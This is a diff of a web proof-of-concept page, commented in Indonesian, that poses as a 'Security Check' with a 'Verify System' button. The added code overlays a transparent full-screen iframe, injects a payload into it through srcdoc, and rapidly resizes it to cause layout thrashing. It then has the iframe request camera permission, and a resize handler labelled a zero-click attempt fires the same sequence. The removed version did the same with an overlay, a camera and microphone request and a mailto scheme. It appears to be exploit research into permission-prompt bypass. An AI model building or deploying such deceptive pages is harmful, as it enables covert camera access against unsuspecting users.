@@ -3,39 +3,40 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Security</title>
+<title>System Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #f0f4f8;
     font-family: -apple-system, BlinkMacSystemFont, sans-serif;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0;
-    transition: background 0.1s;
+    height: 100vh; margin: 0; flex-direction: column;
+    overflow: hidden;
   }
   .panel {
     background: #fff; padding: 40px; border-radius: 12px;
     box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
-    max-width: 400px; width: 100%; z-index: 10;
+    max-width: 400px; width: 100%; z-index: 10; position: relative;
   }
-  h1 { color: #333; margin-bottom: 10px; }
-  p { color: #666; margin-bottom: 20px; }
+  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
+  p { color: #666; margin-bottom: 20px; font-size: 14px; }
   button {
     background: #007aff; color: #fff; padding: 15px 30px;
     border-radius: 8px; font-size: 18px; font-weight: bold;
     cursor: pointer; border: none; width: 100%;
-    position: relative; overflow: hidden;
+    position: relative; z-index: 20;
   }
-  
-  /* Overlay Palsu untuk Clickjacking saat Resize */
-  #overlay {
-    position: fixed; top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    background: rgba(0, 0, 0, 0.5);
+
+  /* Iframe Tersembunyi (Akan di-resize secara brutal) */
+  #trapFrame {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    opacity: 0; /* Transparan, menutupi layar */
     z-index: 9999;
-    display: none;
-    pointer-events: none;
-    transition: opacity 0.3s;
+    border: none;
+    pointer-events: none; /* Biarkan klik ke tombol */
+    transition: all 0.1s;
   }
 
   #log {
@@ -43,18 +44,20 @@
     padding: 10px; font-family: monospace; font-size: 12px;
     border-radius: 6px; width: 100%; max-width: 400px;
     height: 120px; overflow-y: auto; text-align: left;
+    z-index: 10000; position: relative;
   }
 </style>
 </head>
 <body>
 
-<div id="overlay"></div>
-
 <div class="panel">
-  <h1>🔒 Security Verification</h1>
-  <p>Klik tombol di bawah untuk melanjutkan.</p>
+  <h1>🔒 Security Check</h1>
+  <p>Klik tombol di bawah untuk memverifikasi.</p>
   <button id="startBtn">Verify System</button>
 </div>
+
+<!-- IFRAME PENJEBAK -->
+<iframe id="trapFrame" allow="camera; microphone"></iframe>
 
 <div id="log">Sistem siap...</div>
 
@@ -63,7 +66,7 @@
   'use strict';
 
   var logEl = document.getElementById('log');
-  var overlay = document.getElementById('overlay');
+  var trapFrame = document.getElementById('trapFrame');
   var btn = document.getElementById('startBtn');
   
   function log(msg) {
@@ -72,96 +75,92 @@
   }
 
   // ============================================
-  // 1. UI RACE CONDITION (Resize & Layout Thrashing)
+  // 1. INJEKSI PAYLOAD KE DALAM IFRAME
   // ============================================
-  function triggerUIRaceCondition() {
-    log("[!] Memicu UI Race Condition (Split View)...");
+  var payloadHTML = `
+    <!DOCTYPE html>
+    <html>
+    <body style="margin:0;width:100vw;height:100vh;background:transparent;">
+      <script>
+        // Fungsi untuk meminta izin kamera
+        function requestCam() {
+          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+              .then(function(stream) {
+                parent.postMessage("CAM_GRANTED", "*");
+              })
+              .catch(function(err) {
+                parent.postMessage("CAM_DENIED:" + err.name, "*");
+              });
+          }
+        }
 
-    // A. Paksa Resize
-    window.dispatchEvent(new Event('resize'));
+        // Dengar perintah dari parent
+        window.addEventListener('message', function(e) {
+          if (e.data === 'REQ_CAM') {
+            requestCam();
+          }
+        });
+      <\/script>
+    </body>
+    </html>
+  `;
 
-    // B. Tampilkan Overlay
-    overlay.style.display = 'block';
-    overlay.style.opacity = '1';
+  trapFrame.srcdoc = payloadHTML;
 
-    // C. Paksa Frame Animation (Layout Thrashing)
+  // Listener pesan dari iframe
+  window.addEventListener('message', function(e) {
+    if (e.data === "CAM_GRANTED") {
+      log("🚨 BUG: Kamera DIIZINKAN dari dalam Iframe!");
+    } else if (e.data.indexOf("CAM_DENIED") !== -1) {
+      log("✅ Kamera diblokir: " + e.data.split(":")[1]);
+    }
+  });
+
+  // ============================================
+  // 2. UI RACE CONDITION (Resize Iframe Brutal)
+  // ============================================
+  function triggerIframeReflow() {
+    log("[!] Memicu Reflow Iframe (Layout Thrashing)...");
+    
     var start = Date.now();
-    function rafLoop() {
+    function reflowLoop() {
       if (Date.now() - start < 1000) { 
-        overlay.style.transform = `scale(${1 + Math.random() * 0.1})`;
-        requestAnimationFrame(rafLoop);
+        // Ubah ukuran iframe secara ekstrem setiap frame (60fps)
+        // Ini memaksa browser menghitung ulang layout terus menerus
+        var scale = 1 + (Math.random() * 0.5); // 1.0 - 1.5
+        trapFrame.style.transform = `scale(${scale})`;
+        trapFrame.style.width = `${100 + Math.random() * 50}%`;
+        trapFrame.style.height = `${100 + Math.random() * 50}%`;
+        
+        requestAnimationFrame(reflowLoop);
       } else {
-        overlay.style.display = 'none';
-        log("[!] UI Race Condition Selesai. Memicu Payload...");
-        executePayload();
+        // Kembalikan ke ukuran normal
+        trapFrame.style.transform = 'scale(1)';
+        trapFrame.style.width = '100%';
+        trapFrame.style.height = '100%';
+        log("[!] Reflow selesai. Mengeksekusi prompt kamera...");
+        
+        // Paksa minta kamera
+        trapFrame.contentWindow.postMessage('REQ_CAM', '*');
       }
     }
-    requestAnimationFrame(rafLoop);
-
-    btn.style.opacity = '0';
-    btn.style.pointerEvents = 'none';
-  }
-
-  // ============================================
-  // 2. PAYLOAD EKSEKUSI (Kamera & Protocol Handler)
-  // ============================================
-  function executePayload() {
-    
-    // A. Paksa Minta Izin Kamera
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-        .then(function(stream) {
-          log("[!] Kamera/Mic DIIZINKAN saat UI glitch.");
-          // Hentikan stream setelah diizinkan (agar tidak merekam lama)
-          stream.getTracks().forEach(function(track) { track.stop(); });
-        })
-        .catch(function(err) {
-          log("[-] Kamera diblokir: " + err.name);
-        });
-    }
-
-    // B. Coba Buka Skema Telepon / Email (Ganti sesuai target)
-    // var targetScheme = "tel:+6281234567890"; 
-    var targetScheme = "mailto:security@apple.com";
-    
-    try {
-      window.location.replace(targetScheme);
-      log("[+] Skema (" + targetScheme + ") dieksekusi saat UI sibuk.");
-    } catch(e) {
-      log("[-] Gagal eksekusi skema: " + e.message);
-    }
-
-    // Kembalikan UI
-    setTimeout(function() {
-      btn.style.opacity = '1';
-      btn.style.pointerEvents = 'auto';
-    }, 2000);
+    requestAnimationFrame(reflowLoop);
   }
 
   // ============================================
   // 3. TRIGGER EVENT
   // ============================================
   btn.addEventListener('click', function() {
-    triggerUIRaceCondition();
+    triggerIframeReflow();
   });
 
   // ============================================
-  // 4. ZERO-CLICK SPLIT VIEW ATTEMPT
+  // 4. ZERO-CLICK SPLIT VIEW ATTEMPT (Resize)
   // ============================================
   window.addEventListener('resize', function() {
-    log("[!] Resize terdeteksi (Split View / Rotasi). Memicu bypass...");
-    
-    // Coba minta izin kamera saat resize
-    try {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) { 
-          log("[!] Kamera diizinkan saat resize."); 
-          stream.getTracks().forEach(function(t) { t.stop(); });
-        })
-        .catch(function(err) { 
-          log("[-] Kamera diblokir saat resize: " + err.name); 
-        });
-    } catch(e) {}
+    log("[!] Resize terdeteksi (Split View). Memicu bypass iframe...");
+    triggerIframeReflow();
   });
 
 })();
